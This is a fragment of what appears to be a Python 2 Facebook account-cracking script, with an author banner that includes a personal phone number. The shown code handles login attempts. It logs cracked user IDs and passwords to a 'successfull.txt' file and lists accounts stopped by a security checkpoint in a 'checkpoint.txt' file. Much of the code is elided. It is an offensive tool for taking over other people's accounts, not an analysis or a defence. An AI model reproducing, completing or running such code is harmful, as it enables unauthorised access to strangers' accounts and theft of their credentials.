...
..######..##.....##.##.....##.####.##.....##
  ...
  Auther  :  KAZI SAMIR                                Github  :  kazi samir
  Whapp   :  01817313151
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*samir Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('samir/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[samir(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('samir/checkpoint.txt', 'a')
